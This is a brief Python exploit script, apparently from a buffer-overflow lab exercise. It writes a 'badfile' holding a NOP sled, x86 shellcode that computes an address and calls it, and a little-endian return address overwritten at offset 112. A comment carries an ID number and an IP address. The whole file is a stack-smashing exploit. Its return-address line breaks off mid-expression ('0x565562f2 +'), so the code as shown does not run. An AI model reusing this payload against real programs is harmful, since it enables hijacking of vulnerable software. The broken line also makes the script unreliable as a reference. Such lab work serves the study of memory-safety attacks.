import sys 
# 1805077 20.197.1.189 
shellcode= ( "\xB8\xFF\xFF\x7E\x23\xBB\xFF\xFF\x11\x11\x29\xD8\xFF\xD0" ).encode('latin-1') 
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(1001)) 
# Put the shellcode at the end 
start = 1001 - len(shellcode) 
content[start:] = shellcode 
 
# Put the address at offset 112 
ret = 0x565562f2 + 
content[112:116] = (ret).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 


